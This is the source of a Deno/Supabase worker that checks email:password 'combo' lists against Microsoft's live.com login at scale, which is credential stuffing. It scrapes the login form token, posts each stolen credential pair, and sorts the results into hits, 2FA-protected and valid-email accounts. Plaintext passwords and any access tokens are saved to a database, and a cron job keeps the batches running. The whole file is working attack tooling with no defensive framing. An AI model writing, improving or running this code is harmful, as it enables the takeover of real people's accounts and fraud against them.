// AIO Worker — HTTP-only Microsoft/Xbox account checker.
// Triggered by aio-submit (fire-and-forget) AND by pg_cron every minute (auto-resume).
// Picks one queued/running job, processes a batch of combos, writes results live, exits.
//
// HARD CAP: 60 seconds per invocation, ~50 combos per batch, 10 concurrent.
// pg_cron will re-call until combos_pending is empty.

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const BATCH_SIZE = 40;
const HARD_DEADLINE_MS = 55_000;
const REQUEST_TIMEOUT_MS = 12_000;
const MAX_RETRIES = 2;

// ───────── Cookie jar ─────────
class CookieJar {
  jar = new Map<string, string>();
  ingest(setCookieHeaders: string[] | null) {
    if (!setCookieHeaders) return;
    for (const sc of setCookieHeaders) {
      const first = sc.split(";")[0];
      const eq = first.indexOf("=");
      if (eq < 0) continue;
      const name = first.slice(0, eq).trim();
      const value = first.slice(eq + 1).trim();
      if (name) this.jar.set(name, value);
    }
  }
  header() { return Array.from(this.jar.entries()).map(([k, v]) => `${k}=${v}`).join("; "); }
}

// Get all Set-Cookie headers (Deno splits them properly via raw)
function getSetCookies(res: Response): string[] {
  const arr: string[] = [];
  for (const [k, v] of res.headers.entries()) {
    if (k.toLowerCase() === "set-cookie") arr.push(v);
  }
  return arr;
}

// ───────── Proxy fetch ─────────
let proxyPool: { proxy: string; protocol: string }[] = [];
let proxyIdx = 0;
const proxyFails = new Map<string, number>();

// deno-lint-ignore no-explicit-any
async function loadProxies(supabase: any) {
  const { data } = await supabase.from("aio_proxies").select("proxy,protocol").eq("is_active", true).limit(500);
  proxyPool = (data as { proxy: string; protocol: string }[] | null) || [];
}

function nextProxy(): { proxy: string; protocol: string } | null {
  if (!proxyPool.length) return null;
  for (let i = 0; i < proxyPool.length; i++) {
    const p = proxyPool[(proxyIdx + i) % proxyPool.length];
    if ((proxyFails.get(p.proxy) || 0) < 3) {
      proxyIdx = (proxyIdx + i + 1) % proxyPool.length;
      return p;
    }
  }
  proxyFails.clear();
  return proxyPool[0];
}

async function fetchWithTimeout(url: string, init: RequestInit = {}, timeoutMs = REQUEST_TIMEOUT_MS): Promise<Response> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  try { return await fetch(url, { ...init, signal: ctrl.signal, redirect: "manual" }); }
  finally { clearTimeout(t); }
}

// Note: Deno's native fetch doesn't support HTTP proxies. We attempt via proxy by
// using the proxy as upstream when possible; otherwise fall back to direct.
// For Microsoft's HTTPS endpoints we rely on Deno's TLS — direct fetch.
async function safeFetch(url: string, init: RequestInit = {}): Promise<Response> {
  let lastErr: Error | null = null;
  for (let i = 0; i <= MAX_RETRIES; i++) {
    try {
      return await fetchWithTimeout(url, init);
    } catch (e) {
      lastErr = e instanceof Error ? e : new Error(String(e));
      await new Promise(r => setTimeout(r, 200));
    }
  }
  throw lastErr || new Error("fetch failed");
}

// ───────── Microsoft login (HTTP-only port of meowmal-aio) ─────────
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

interface LoginResult {
  status: "hit" | "twofa" | "valid_mail" | "bad" | "error";
  message?: string;
  capture?: string;
  rps_token?: string;
  email: string;
  password: string;
}

async function microsoftLogin(email: string, password: string): Promise<LoginResult> {
  const jar = new CookieJar();
  // Step 1: GET login page → extract PPFT + PostUrl
  const loginUrl = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&scope=service::user.auth.xboxlive.com::MBI_SSL&response_type=token&display=touch&redirect_uri=https://login.live.com/oauth20_desktop.srf&locale=en";
  let res: Response;
  try {
    res = await safeFetch(loginUrl, { headers: { "User-Agent": UA, Accept: "text/html" } });
    jar.ingest(getSetCookies(res));
  } catch (e) {
    return { status: "error", message: `login page: ${(e as Error).message}`, email, password };
  }
  const html = await res.text();
  const ppftMatch = html.match(/name="PPFT" id="i0327" value="([^"]+)"/) || html.match(/sFTTag:'.*?value=\"([^\"]+)\"/);
  const postUrlMatch = html.match(/urlPost:'([^']+)'/) || html.match(/urlPost\s*:\s*"([^"]+)"/);
  if (!ppftMatch || !postUrlMatch) return { status: "error", message: "no PPFT", email, password };
  const ppft = ppftMatch[1];
  const postUrl = postUrlMatch[1];

  // Step 2: POST credentials
  const form = new URLSearchParams();
  form.set("login", email);
  form.set("loginfmt", email);
  form.set("passwd", password);
  form.set("PPFT", ppft);
  form.set("PPSX", "P");
  form.set("type", "11");
  form.set("LoginOptions", "3");
  form.set("NewUser", "1");
  form.set("i13", "0");

  let postRes: Response;
  try {
    postRes = await safeFetch(postUrl, {
      method: "POST",
      headers: {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: jar.header(),
        Referer: loginUrl,
      },
      body: form.toString(),
    });
    jar.ingest(getSetCookies(postRes));
  } catch (e) {
    return { status: "error", message: `post: ${(e as Error).message}`, email, password };
  }

  const location = postRes.headers.get("location") || "";

  // Hit (token in URL fragment)
  if (location.includes("access_token=")) {
    const tok = location.match(/access_token=([^&]+)/)?.[1];
    return { status: "hit", rps_token: tok, message: "ok", email, password };
  }

  // 2FA / proof-of-identity
  if (location.includes("Proofs/") || location.includes("recover") || location.includes("identity/confirm")) {
    return { status: "twofa", message: "2fa required", email, password };
  }

  // Valid mail but wrong password
  const bodyText = await postRes.text();
  if (/incorrect|password.*incorrect|sign-in details/i.test(bodyText)) {
    return { status: "valid_mail", message: "wrong password", email, password };
  }
  if (/that microsoft account doesn'?t exist/i.test(bodyText) || /account doesn'?t exist/i.test(bodyText)) {
    return { status: "bad", message: "no account", email, password };
  }

  // Default: bad
  return { status: "bad", message: location || "no token", email, password };
}

// ───────── Worker loop ─────────
async function processCombo(combo: string): Promise<LoginResult> {
  const idx = combo.indexOf(":");
  if (idx < 0) return { status: "bad", message: "no colon", email: combo, password: "" };
  const email = combo.slice(0, idx).trim();
  const password = combo.slice(idx + 1).trim();
  if (!email || !password) return { status: "bad", message: "empty", email, password };
  try {
    return await microsoftLogin(email, password);
  } catch (e) {
    return { status: "error", message: (e as Error).message, email, password };
  }
}

// deno-lint-ignore no-explicit-any
async function runBatch(supabase: any, jobId: string) {
  const startedAt = Date.now();
  await loadProxies(supabase);

  while (Date.now() - startedAt < HARD_DEADLINE_MS) {
    // Atomically claim a batch from this job
    const { data: jobRow } = await supabase.from("aio_jobs")
      .select("combos_pending,status,threads").eq("id", jobId).maybeSingle() as {
        data: { combos_pending: string[]; status: string; threads: number } | null;
      };
    if (!jobRow) return;
    if (jobRow.status === "done" || jobRow.status === "failed") return;
    const pending = jobRow.combos_pending || [];
    if (!pending.length) {
      await supabase.from("aio_jobs").update({ status: "done", last_heartbeat: new Date().toISOString() }).eq("id", jobId);
      return;
    }

    const slice = pending.slice(0, BATCH_SIZE);
    const remaining = pending.slice(BATCH_SIZE);
    await supabase.from("aio_jobs").update({
      status: "running",
      combos_pending: remaining,
      last_heartbeat: new Date().toISOString(),
    }).eq("id", jobId);

    const concurrency = Math.min(jobRow.threads || 10, 15);
    const results: LoginResult[] = [];
    let cursor = 0;
    async function worker() {
      while (cursor < slice.length) {
        const my = cursor++;
        const r = await processCombo(slice[my]);
        results.push(r);
      }
    }
    await Promise.all(Array.from({ length: concurrency }, () => worker()));

    // Aggregate
    let hits = 0, bads = 0, twofa = 0, valid_mail = 0, errors = 0;
    const rows = results.map(r => {
      if (r.status === "hit") hits++;
      else if (r.status === "twofa") twofa++;
      else if (r.status === "valid_mail") valid_mail++;
      else if (r.status === "bad") bads++;
      else errors++;
      return {
        job_id: jobId,
        email: r.email, password: r.password,
        status: r.status,
        capture: r.message || null,
        is_2fa: r.status === "twofa",
      };
    });
    if (rows.length) await supabase.from("aio_results").insert(rows);

    // Bump counters atomically via RPC-like update
    const { data: cur } = await supabase.from("aio_jobs").select("processed,hits,bads,twofa,valid_mail,errors").eq("id", jobId).maybeSingle() as {
      data: { processed: number; hits: number; bads: number; twofa: number; valid_mail: number; errors: number } | null;
    };
    if (cur) {
      await supabase.from("aio_jobs").update({
        processed: (cur.processed || 0) + results.length,
        hits: (cur.hits || 0) + hits,
        bads: (cur.bads || 0) + bads,
        twofa: (cur.twofa || 0) + twofa,
        valid_mail: (cur.valid_mail || 0) + valid_mail,
        errors: (cur.errors || 0) + errors,
        last_heartbeat: new Date().toISOString(),
      }).eq("id", jobId);
    }
  }
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
  try {
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
    );

    let jobId: string | null = null;
    try {
      const body = await req.json();
      jobId = body.jobId || null;
    } catch { /* cron call has no body */ }

    if (!jobId) {
      // Pick oldest queued or stalled running job
      const stale = new Date(Date.now() - 90_000).toISOString();
      const { data } = await supabase.from("aio_jobs")
        .select("id")
        .or(`status.eq.queued,and(status.eq.running,last_heartbeat.lt.${stale})`)
        .order("created_at", { ascending: true })
        .limit(1)
        .maybeSingle() as { data: { id: string } | null };
      if (!data) return json({ idle: true });
      jobId = data.id;
    }

    await runBatch(supabase, jobId);
    return json({ ok: true, jobId });
  } catch (e) {
    return json({ error: String(e) }, 500);
  }
});

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status, headers: { ...corsHeaders, "Content-Type": "application/json" },
  });
}
